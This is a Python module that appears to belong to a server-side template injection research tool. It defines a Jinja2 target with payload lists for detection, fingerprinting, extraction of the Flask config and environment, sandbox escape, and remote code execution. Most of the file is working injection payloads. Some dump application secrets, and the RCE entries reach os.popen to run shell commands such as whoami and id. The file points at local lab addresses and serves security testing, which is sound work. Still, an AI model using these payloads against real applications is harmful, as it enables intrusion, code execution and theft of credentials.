"""Jinja2 engine definition for RENDER SSTI research platform."""

from engines.base import TemplateEngine, ProbePayload


class Jinja2Engine(TemplateEngine):
    """Jinja2 template engine attack surface."""

    def __init__(self) -> None:
        super().__init__(
            name="jinja2",
            language="python",
            framework="Flask/Django",
            default_vulnerable_url="http://127.0.0.1:5001",
            default_hardened_url="http://127.0.0.1:5002",
            detection_probes=[
                ProbePayload(
                    id="j2-detect-001",
                    name="Math Evaluation Probe",
                    stage="detection",
                    payload="{{7*7}}",
                    expected="49",
                    explanation="Jinja2 evaluates {{7*7}} to 49; plain text would echo '{{7*7}}'.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-detect-002",
                    name="String Multiplication Probe",
                    stage="detection",
                    payload="{{'abc'*3}}",
                    expected="abcabcabc",
                    explanation="Jinja2 evaluates string repetition.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-detect-003",
                    name="Arithmetic Addition Probe",
                    stage="detection",
                    payload="{{41+1}}",
                    expected="42",
                    explanation="Addition probe confirms live expression evaluation.",
                    safety_scope="local_lab_only",
                ),
            ],
            fingerprint_probes=[
                ProbePayload(
                    id="j2-fp-001",
                    name="Config Object Access",
                    stage="fingerprinting",
                    payload="{{config}}",
                    expected="<Config",
                    explanation="Jinja2 exposes Flask's config object in the template context.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-fp-002",
                    name="Self Class Probe",
                    stage="fingerprinting",
                    payload="{{self.__class__}}",
                    expected="TemplateReference",
                    explanation="Jinja2's self refers to TemplateReference.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-fp-003",
                    name="String Multiplication (5)",
                    stage="fingerprinting",
                    payload="{{'a'*5}}",
                    expected="aaaaa",
                    explanation="Jinja2-specific string multiplication syntax.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-fp-004",
                    name="Lipsum Function",
                    stage="fingerprinting",
                    payload="{{lipsum}}",
                    expected="lipsum",
                    explanation="lipsum is a Jinja2 global function not present in other engines.",
                    safety_scope="local_lab_only",
                ),
            ],
            extract_payloads=[
                ProbePayload(
                    id="j2-ext-001",
                    name="Config Items",
                    stage="extraction",
                    payload="{{config.items()}}",
                    expected="dict_items",
                    explanation="Extracts Flask config key-value pairs.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-ext-002",
                    name="Request Environ",
                    stage="extraction",
                    payload="{{request.environ}}",
                    expected="environ",
                    explanation="Extracts WSGI environment including env vars and headers.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-ext-003",
                    name="Application Globals",
                    stage="extraction",
                    payload="{{request.application.__globals__}}",
                    expected="__builtins__",
                    explanation="Dumps Flask application globals including builtins.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-ext-004",
                    name="Global Namespace",
                    stage="extraction",
                    payload="{{namespace().__init__.__globals__}}",
                    expected="__builtins__",
                    explanation="Access globals via Jinja2 namespace object.",
                    safety_scope="local_lab_only",
                ),
            ],
            escape_payloads=[
                ProbePayload(
                    id="j2-esc-001",
                    name="MRO Subclasses Dump",
                    stage="escape",
                    payload="{{''.__class__.__mro__[1].__subclasses__()}}",
                    expected="subprocess",
                    explanation="Walks Python's MRO to enumerate all loaded subclasses.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-esc-002",
                    name="Application Globals Builtins",
                    stage="escape",
                    payload="{{request.application.__globals__['__builtins__']}}",
                    expected="__import__",
                    explanation="Reaches Python builtins through Flask's application globals.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-esc-003",
                    name="cycler.__init__ globals",
                    stage="escape",
                    payload="{{cycler.__init__.__globals__['os']}}",
                    expected="posix",
                    explanation="Jinja2 built-in cycler exposes os module if imported.",
                    safety_scope="local_lab_only",
                ),
            ],
            rce_payloads=[
                ProbePayload(
                    id="j2-rce-001",
                    name="RCE via __import__ popen (whoami)",
                    stage="rce",
                    payload=(
                        "{{''.__class__.__mro__[1].__subclasses__()[400]"
                        ".__init__.__globals__['__builtins__']['__import__']('os')"
                        ".popen('whoami').read()}}"
                    ),
                    expected="whoami_output",
                    explanation=(
                        "Accesses Python builtins through subclass chain to call "
                        "os.popen('whoami').read(). Index 400 is approximate; "
                        "AttackRunner probes for the correct index."
                    ),
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-rce-002",
                    name="RCE via request.application globals (id)",
                    stage="rce",
                    payload=(
                        "{{request.application.__globals__['__builtins__']"
                        "['__import__']('os').popen('id').read()}}"
                    ),
                    expected="uid=",
                    explanation="Uses Flask application globals path to reach os.popen.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="j2-rce-003",
                    name="RCE via namespace globals (hostname)",
                    stage="rce",
                    payload=(
                        "{{namespace().__init__.__globals__['__builtins__']"
                        "['__import__']('os').popen('hostname').read()}}"
                    ),
                    expected="hostname_output",
                    explanation="Namespace object path to os.popen for hostname.",
                    safety_scope="local_lab_only",
                ),
            ],
        )

    def check_fingerprint(self, response_text: str) -> bool:
        markers = ["<Config", "TemplateReference", "aaaaa", "lipsum"]
        return any(m in response_text for m in markers)
